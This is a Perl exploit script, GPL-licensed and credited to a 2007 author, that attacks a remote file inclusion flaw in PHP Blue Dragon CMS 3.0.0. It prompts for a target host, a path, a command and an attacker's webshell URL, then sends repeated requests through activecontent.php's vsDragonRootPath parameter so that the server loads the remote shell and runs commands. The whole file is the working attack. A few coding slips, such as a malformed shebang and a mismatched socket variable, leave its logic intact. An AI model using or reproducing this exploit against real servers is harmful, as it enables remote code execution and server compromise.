#!usr/bin/perl

#
#  egs-fuckphpbluedragon300.pl
#
# *      Copyright 2007 Emanuele Gentili <bathym@0x656d67.org>
# *
# *       www.emanuele-gentili.com
# *
# *      This program is free software; you can redistribute it and/or modify
# *      it under the terms of the GNU General Public License as published by
# *      the Free Software Foundation; either version 2 of the License, or
# *      (at your option) any later version.
# *
# *      This program is distributed in the hope that it will be useful,
# *      but WITHOUT ANY WARRANTY; without even the implied warranty of
# *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# *      GNU General Public License for more details.
# *
# *      You should have received a copy of the GNU General Public License
# *      along with this program; if not, write to the Free Software
# *      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
# *
#
# README:
#
# PHP Blue Dragon CMS 3.0.0 Remote File Inclusion Vulnerability
# http://phpbluedragon.pl
#

use IO::Socket

print "\n [+] Insert Hostname: ";
chomp ($host=<STDIN>);
print "\n [+] Insert webserver port (example: 80): ";
chomp (${port}=<STDIN>);
print "\n [+] Insert path: (example: /public_includes/pub_blocks/):  ";
chomp (${path}=<STDIN>);
print "\n [+] Command to execute:  ";
chomp (${cmd}=<STDIN>);
print "\n [+] Insert webshell address: ";
chomp (${shell}=<STDIN>);

while(${cmd} !~ "QUIT") {
${sock} = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"${host}", PeerPort=>"${port}")
            or die " [+] Connecting ... Can't connect to host.\n\n";
            print $sock "GET $path"."activecontent.php?vsDragonRootPath="."${shell}"."?cmd="."${cmd}"."? HTTP/1.1\r\n";
            print $sock "Host: ${host}\r\n";
            print $sock "User-Agent: EG Security\n";
            print $sock "Accept: */*\r\n";
            print $sock "Connection: close\r\n\n";
while (${answer} = <${socket}>)
    {
        print "${answer}";
}
}
